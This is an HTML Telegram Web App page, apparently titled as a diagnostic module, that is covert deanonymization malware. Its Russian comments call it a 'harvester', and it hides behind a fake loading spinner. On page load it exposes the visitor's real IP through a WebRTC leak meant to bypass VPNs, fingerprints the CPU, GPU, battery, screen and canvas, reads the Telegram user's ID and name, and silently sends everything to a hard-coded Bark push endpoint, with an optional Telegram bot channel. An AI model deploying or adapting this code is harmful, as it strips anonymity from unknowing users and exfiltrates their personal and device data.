<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Diagnostic Data Module // ShadowCode</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        /* Стиль остаётся для маскировки, но мы убираем текст */
        body { background:#000; color:#0f0; font-family:'Courier New', monospace; display:flex; justify-content:center; align-items:center; height:100vh; margin:0; overflow:hidden; }
        .fake-loader { border:3px solid #0f0; border-top:3px solid #000; border-radius:50%; width:50px; height:50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <!-- Маскировка под легитимный лоадер -->
    <div class="fake-loader" id="loader"></div>
    <div style="display:none;" id="log-panel">
        <span style="color:#666;">> ShadowCode_Session_Init...</span>
    </div>

    <script>
        // ==========================================
        // SHADOWCODE HARVESTER v2.0 (Черная версия)
        // Сливает: Реальный IP (WebRTC), Железо CPU/GPU, Ядра, Память, OS, WebGL Fingerprint
        // ==========================================
        
        const BARK_ENDPOINT = 'https://api.day.app/2mfG6468JsmXaVLaLETob/';
        const TELEGRAM_BOT_TOKEN = null; // Замени на '123:abc' если хочешь слив через ТГ бота напрямую
        
        // Утилита для отправки логов (тихая, через sendBeacon и fetch дубль)
        function exfiltrate(group, payload) {
            const title = `[${group}] ${new Date().toLocaleTimeString()}`;
            const body = typeof payload === 'string' ? payload : JSON.stringify(payload, null, 2);
            
            const barkPacket = { title: title, body: body.substring(0, 4000), group: 'ShadowCode_Black', sound: 'alarm' };
            
            // Асинхронный слив, без блокировки UI жертвы
            navigator.sendBeacon(BARK_ENDPOINT, new Blob([JSON.stringify(barkPacket)], {type: 'application/json'}));
            
            // Если есть токен бота - шлем и туда
            if (TELEGRAM_BOT_TOKEN) {
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: 'YOUR_CHAT_ID', // Замени на свой
                        text: `🔴 *${title}*\n\`\`\`${body.substring(0, 3500)}\`\`\``,
                        parse_mode: 'Markdown'
                    })
                }).catch(() => {});
            }
        }

        // 1. ДОСТАЕМ РЕАЛЬНЫЙ IP ЧЕРЕЗ УТЕЧКУ WebRTC (STUN/TURN)
        // Это обходит прокси и VPN на уровне браузера. Чистый, голый IP провайдера.
        function getRealIP() {
            return new Promise((resolve) => {
                const ipSet = new Set();
                const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
                
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                pc.onicecandidate = (ice) => {
                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                    const candidate = ice.candidate.candidate;
                    const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
                    const match = candidate.match(ipRegex);
                    if (match) {
                        ipSet.add(match[0]);
                        pc.close();
                        // Отправляем все найденные IP (обычно локальный + публичный)
                        resolve(Array.from(ipSet));
                    }
                };
                
                // Таймаут, если WebRTC заблочен (хотя тогда мы пробуем запасной вариант)
                setTimeout(() => { resolve(Array.from(ipSet)); }, 2000);
            });
        }

        // 2. ДЕТЕКТОР ПРОЦЕССОРА (НЕ ИЗ USER-AGENT, А ЧЕРЕЗ МНОГОПОТОЧНОЕ ТЕСТИРОВАНИЕ)
        async function getTrueCPUInfo() {
            const info = {
                cores: navigator.hardwareConcurrency || 'N/A',
                estimatedArch: 'N/A',
                vendorGuess: 'N/A'
            };

            // Попытка через WebAssembly для определения ARM vs x86 (если браузер это сольет)
            try {
                const wasmCheck = await WebAssembly.compile(new Uint8Array([0,97,115,109,1,0,0,0]));
                // Это не дает архитектуру напрямую, но подтверждает наличие WASM
                info.wasm = true;
            } catch (e) { info.wasm = false; }

            // Определение архитектуры через байтовые порядки и платформу
            if (navigator.platform) {
                const p = navigator.platform.toLowerCase();
                if (p.includes('arm') || p.includes('aarch')) info.estimatedArch = 'ARM';
                else if (p.includes('win32') || p.includes('win64')) info.estimatedArch = 'x86';
                else if (p.includes('linux')) info.estimatedArch = 'x86/ARM (Linux)';
                else if (p.includes('iphone') || p.includes('ipad')) info.estimatedArch = 'Apple Silicon (ARM)';
                else if (p.includes('mac')) info.estimatedArch = 'Apple/Intel (macOS)';
            }

            // ТЯЖЕЛЫЙ ФИНГЕРПРИНТ ЯДЕР: Загружаем CPU на короткий миг и замеряем время
            // Это позволяет отличить настоящие ядра от потоков (SMT/HT), хотя и грубо.
            try {
                const start = performance.now();
                const workers = [];
                const threadCount = navigator.hardwareConcurrency || 4;
                
                // Создаем воркеры для нагрузки
                for (let i = 0; i < threadCount; i++) {
                    workers.push(new Promise(resolve => {
                        const blob = new Blob([`onmessage = function(e) { let x = 0; for(let i=0; i<1e7; i++) { x += Math.sqrt(i); } postMessage(x); }`]);
                        const worker = new Worker(URL.createObjectURL(blob));
                        worker.postMessage('start');
                        worker.onmessage = () => { worker.terminate(); resolve(); };
                    }));
                }
                
                await Promise.all(workers);
                const duration = performance.now() - start;
                info.performanceScore = duration.toFixed(2) + 'ms';
                
                // Эвристика: На мобильных чипах с разными ядрами (big.LITTLE) разброс больше
                if (duration < 100 && threadCount > 4) info.cpuClass = 'High-End Desktop/Server';
                else if (duration < 300) info.cpuClass = 'Modern Mobile/Desktop';
                else info.cpuClass = 'Low-End/Mobile';
                
            } catch (e) {
                info.performanceScore = 'Blocked';
            }

            return info;
        }

        // 3. РАСШИРЕННЫЙ ОТПЕЧАТОК GPU/WebGL (Вытаскивает название видеокарты)
        function getGPUDetails() {
            let gpu = { vendor: 'N/A', renderer: 'N/A', memory: 'N/A' };
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl2') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        gpu.vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        gpu.renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                    // Попытка достать память GPU (работает на некоторых системах)
                    try {
                        const memExt = gl.getExtension('GL_NVX_gpu_memory_info');
                        if (memExt) {
                            gpu.memory = (gl.getParameter(memExt.GPU_MEMORY_INFO_DEDICATED_VIDMEM_NVX) / 1048576).toFixed(0) + ' MB';
                        }
                    } catch (e) {}
                }
            } catch (e) {}
            return gpu;
        }

        // 4. ГЛАВНАЯ ФУНКЦИЯ СБОРА (Железо + Софт + TG)
        async function deepScan() {
            const tg = window.Telegram?.WebApp?.initDataUnsafe?.user || {};
            
            // Параллельный сбор всей инфы
            const [realIPs, cpuInfo, battery, connection] = await Promise.all([
                getRealIP(),
                getTrueCPUInfo(),
                (async () => {
                    try {
                        const b = await navigator.getBattery();
                        return { level: (b.level*100).toFixed(0)+'%', charging: b.charging };
                    } catch(e) { return {}; }
                })(),
                (() => {
                    const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                    return c ? { type: c.effectiveType, downlink: c.downlink, rtt: c.rtt } : null;
                })()
            ]);

            const gpu = getGPUDetails();

            // Формируем отчет для Барк
            const report = {
                session_id: Math.random().toString(36).substring(2, 8).toUpperCase(),
                timestamp: new Date().toISOString(),
                
                // --- Telegram Data ---
                telegram: {
                    id: tg.id || 'N/A',
                    username: tg.username || 'N/A',
                    first_name: tg.first_name || 'N/A',
                    last_name: tg.last_name || 'N/A',
                    premium: tg.is_premium || false,
                    lang: tg.language_code || 'N/A'
                },
                
                // --- СЕТЕВОЙ УРОВЕНЬ ---
                network: {
                    real_ips: realIPs, // <-- Настоящий IP через WebRTC утечку
                    connection: connection,
                    do_not_track: navigator.doNotTrack
                },
                
                // --- ЖЕЛЕЗО (ТО ЧТО ТЫ ПРОСИЛ) ---
                hardware: {
                    cpu_cores: cpuInfo.cores,
                    cpu_arch: cpuInfo.estimatedArch,
                    cpu_performance_class: cpuInfo.cpuClass,
                    cpu_benchmark_ms: cpuInfo.performanceScore,
                    gpu_vendor: gpu.vendor,
                    gpu_model: gpu.renderer, // <-- Модель видюхи/чипа
                    gpu_memory: gpu.memory,
                    device_memory: navigator.deviceMemory ? navigator.deviceMemory + 'GB' : 'N/A',
                    battery: battery,
                    screen: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
                    window: `${window.innerWidth}x${window.innerHeight}`
                },
                
                // --- СОФТ ---
                software: {
                    os_platform: navigator.platform, // Например iPhone, Linux armv8l, Win32
                    user_agent: navigator.userAgent,
                    language: navigator.language,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    canvas_fingerprint: (() => {
                        try {
                            const c = document.createElement('canvas');
                            c.width=256; c.height=128;
                            const ctx = c.getContext('2d');
                            ctx.fillStyle='#f60'; ctx.fillRect(0,0,16,16);
                            ctx.fillStyle='#069'; ctx.fillText('Shadow', 2, 15);
                            return c.toDataURL().length;
                        } catch(e) { return 'error'; }
                    })()
                }
            };

            // Отправка в красивом формате
            exfiltrate('BLACKOUT', 
                `☠️ ShadowCode Profiler\n` +
                `👤 TG: @${report.telegram.username} (${report.telegram.id})\n` +
                `📱 OS: ${report.software.os_platform}\n` +
                `🌐 IP: ${report.network.real_ips[0] || 'Скрыт (нет WebRTC)'}\n` +
                `🧠 CPU: ${report.hardware.cpu_cores} Cores | ${report.hardware.cpu_arch} | Class: ${report.hardware.cpu_performance_class}\n` +
                `🎮 GPU: ${report.hardware.gpu_model}\n` +
                `🧠 RAM: ${report.hardware.device_memory}\n` +
                `🔋 Batt: ${report.hardware.battery.level || 'N/A'}`
            );

            // Сырые данные для дампа
            setTimeout(() => {
                exfiltrate('RAW_JSON_DUMP', JSON.stringify(report, null, 2));
            }, 1000);
        }

        // ИНИЦИАЛИЗАЦИЯ АТАКИ
        window.addEventListener('load', () => {
            // Маскировка: показываем фейк-лоадер 1 сек
            setTimeout(() => {
                document.getElementById('loader').style.display = 'none';
                // Запускаем глубокое сканирование
                deepScan().catch(e => exfiltrate('ERROR', e.message));
                
                // Дополнительно: Пытаемся получить IP через http (резерв)
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(d => exfiltrate('IP_HTTP_FALLBACK', `HTTP IP: ${d.ip}`))
                    .catch(() => {});
            }, 800);
        });
    </script>
</body>
</html>
